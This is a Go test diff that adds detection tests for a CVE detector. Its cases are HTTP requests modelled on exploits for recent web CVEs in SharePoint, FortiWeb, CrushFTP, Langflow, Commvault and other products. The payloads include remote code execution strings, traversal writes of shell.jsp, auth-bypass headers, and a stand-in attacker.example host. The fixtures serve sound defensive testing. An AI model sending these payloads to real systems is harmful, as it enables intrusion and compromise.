@@ -146,6 +146,139 @@ func TestCVEDetector_PathTraversal(t *testing.T) {
 	}
 }
 
+func TestCVEDetector_RecentWebCVEs(t *testing.T) {
+	d := NewCVEDetector()
+
+	tests := []struct {
+		name        string
+		path        string
+		query       string
+		headers     map[string]string
+		body        string
+		contentType string
+		wantCVE     string
+	}{
+		{
+			name:    "vite fs raw bypass",
+			path:    "/@fs/tmp/secret.txt",
+			query:   "import&raw??",
+			wantCVE: "CVE-2025-30208",
+		},
+		{
+			name:        "langflow validate code rce",
+			path:        "/api/v1/validate/code",
+			body:        `{"code":"__import__('os').system('id')"}`,
+			contentType: "application/json",
+			wantCVE:     "CVE-2025-3248",
+		},
+		{
+			name:    "xwiki solrsearch groovy rce",
+			path:    "/xwiki/bin/get/Main/SolrSearch",
+			query:   "media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(42)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D",
+			wantCVE: "CVE-2025-24893",
+		},
+		{
+			name:        "sharepoint toolshell toolpane",
+			path:        "/_layouts/15/ToolPane.aspx",
+			query:       "DisplayMode=Edit&a=/ToolPane.aspx",
+			headers:     map[string]string{"Referer": "/_layouts/SignOut.aspx"},
+			body:        "MSOTlPn_DWP=payload&__VIEWSTATE=large",
+			contentType: "application/x-www-form-urlencoded",
+			wantCVE:     "CVE-2025-53770",
+		},
+		{
+			name:    "sharepoint toolshell web shell",
+			path:    "/_layouts/15/spinstall0.aspx",
+			wantCVE: "CVE-2025-53770",
+		},
+		{
+			name:        "commvault deploywebpackage rce",
+			path:        "/commandcenter/deployWebpackage.do",
+			body:        "commcellName=http://attacker.example&servicePack=../../Reports/MetricsUpload/shell/&version=x",
+			contentType: "application/x-www-form-urlencoded",
+			wantCVE:     "CVE-2025-34028",
+		},
+		{
+			name:        "crs multipart dangerous charset bypass",
+			path:        "/upload",
+			body:        "--abc\r\nContent-Disposition: form-data; name=\"username\"\r\nContent-Type: text/plain; charset=utf-7\r\n\r\n+ADw-script+AD4-alert(1)+ADw-/script+AD4-\r\n--abc\r\nContent-Disposition: form-data; name=\"dummy\"\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nok\r\n--abc--\r\n",
+			contentType: "multipart/form-data; boundary=abc",
+			wantCVE:     "CVE-2026-21876",
+		},
+		{
+			name:        "wing ftp null byte lua rce",
+			path:        "/loginok.html",
+			body:        `username=anonymous%00]]%0dlocal+h+%3d+io.popen("id")%0d--&password=x`,
+			contentType: "application/x-www-form-urlencoded",
+			wantCVE:     "CVE-2025-47812",
+		},
+		{
+			name:        "magicinfo swupdate traversal file write",
+			path:        "/MagicInfo/servlet/SWUpdateFileUploader",
+			body:        `fileName=../../../../server/default/deploy/shell.jsp&file=test`,
+			contentType: "application/x-www-form-urlencoded",
+			wantCVE:     "CVE-2025-4632",
+		},
+		{
+			name:    "fortiweb fwbcgi cgiinfo auth bypass",
+			path:    "/api/v2.0/cmd/system/admin%3F/../../../../../cgi-bin/fwbcgi",
+			headers: map[string]string{"CGIINFO": "eyJ1c2VybmFtZSI6ImFkbWluIiwicHJvZm5hbWUiOiJwcm9mX2FkbWluIn0="},
+			body:    `{}`,
+			wantCVE: "CVE-2025-64446",
+		},
+		{
+			name:    "goanywhere license activation auth bypass",
+			path:    "/goanywhere/license/Unlicensed.xhtml/watchTowr",
+			query:   "javax.faces.ViewState=x&GARequestAction=activate",
+			wantCVE: "CVE-2025-10035",
+		},
+		{
+			name:        "spring gateway actuator spel",
+			path:        "/actuator/gateway/routes/rce",
+			body:        `{"filters":[{"name":"AddResponseHeader","args":{"name":"x","value":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}}]}`,
+			contentType: "application/json",
+			wantCVE:     "CVE-2025-41243",
+		},
+		{
+			name:        "invision customcss expression rce",
+			path:        "/",
+			body:        `app=core&module=system&controller=themeeditor&do=customCss&content=%7Bexpression%3D%22die(system('id'))%22%7D`,
+			contentType: "application/x-www-form-urlencoded",
+			wantCVE:     "CVE-2025-47916",
+		},
+		{
+			name:    "crushftp s3 auth bypass",
+			path:    "/WebInterface/function/",
+			query:   "command=getUserList&serverGroup=MainUsers",
+			headers: map[string]string{"Authorization": "AWS4-HMAC-SHA256 Credential=crushadmin/, SignedHeaders=host, Signature=deadbeef"},
+			wantCVE: "CVE-2025-31161",
+		},
+		{
+			name:    "fortinet authhash hostcheck rce",
+			path:    "/remote/hostcheck_validate",
+			headers: map[string]string{"Cookie": "AuthHash=enc=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"},
+			wantCVE: "CVE-2025-32756",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			req := BuildCVERequest(tt.path, tt.query, tt.headers, []byte(tt.body), tt.contentType)
+			matches := d.Detect(req)
+			found := false
+			for _, m := range matches {
+				if m.CVEID == tt.wantCVE {
+					found = true
+					break
+				}
+			}
+			if !found {
+				t.Fatalf("%s not detected, matches=%v", tt.wantCVE, matches)
+			}
+		})
+	}
+}
+
 func TestCVEDetector_NoFalsePositive(t *testing.T) {
 	d := NewCVEDetector()
 
